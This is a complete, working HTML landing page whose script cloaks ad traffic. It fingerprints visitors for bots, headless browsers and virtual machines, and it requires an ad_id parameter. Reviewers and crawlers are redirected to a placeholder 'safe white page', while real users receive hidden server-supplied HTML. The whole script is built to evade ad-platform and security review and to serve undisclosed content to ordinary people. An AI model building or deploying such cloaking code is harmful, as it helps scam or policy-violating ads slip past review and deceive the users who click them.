<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="referrer" content="no-referrer">
    <title>Cargando...</title>
    <style>
        body {
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        (function() {
            const APP_FALLBACK_URL = "https://SUA-PAGINA-WHITE-SEGURA.com";

            const loadDefaultView = () => {
                window.location.replace(APP_FALLBACK_URL);
            };

            const checkClientCapabilities = () => {
                try {
                    if (
                        navigator.webdriver === true ||
                        window.callPhantom ||
                        window._phantom ||
                        window.__nightmare ||
                        document.__selenium_unwrapped ||
                        document.__webdriver_evaluate ||
                        document.__driver_evaluate
                    ) {
                        return false;
                    }

                    if (window.outerWidth === 0 && window.outerHeight === 0) {
                        return false;
                    }

                    const threads = navigator.hardwareConcurrency || 0;
                    if (threads < 2 || threads > 64) {
                        return false;
                    }

                    if (!Array.isArray(navigator.languages) || navigator.languages.length === 0) {
                        return false;
                    }

                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) {
                        return false;
                    }

                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        const renderer = String(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || '').toLowerCase();
                        const softwareAdapters = ['swiftshader', 'llvmpipe', 'mesa offscreen', 'virtualbox', 'vmware'];
                        if (softwareAdapters.some(sig => renderer.includes(sig))) {
                            return false;
                        }
                    }

                    const loseContext = gl.getExtension('WEBGL_lose_context');
                    if (loseContext) loseContext.loseContext();

                    return true;
                } catch {
                    return false;
                }
            };

            const bootstrapSession = async () => {
                const searchParams = new URLSearchParams(window.location.search);
                const adId = searchParams.get('ad_id');

                if (!adId || !checkClientCapabilities()) {
                    return loadDefaultView();
                }

                try {
                    const queryString = window.location.search;
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 6000);

                    const response = await fetch(`/api/session${queryString}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            status: "ready",
                            tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
                            viewport: `${window.screen.width}x${window.screen.height}`
                        }),
                        signal: controller.signal
                    });

                    clearTimeout(timeoutId);

                    if (!response.ok) {
                        return loadDefaultView();
                    }

                    const html = await response.text();
                    if (html && html.trim().length > 0) {
                        document.open();
                        document.write(html);
                        document.close();
                    } else {
                        loadDefaultView();
                    }
                } catch {
                    loadDefaultView();
                }
            };

            setTimeout(bootstrapSession, 300);
        })();
    </script>
</head>
<body>
    <div class="loader"></div>
</body>
</html>
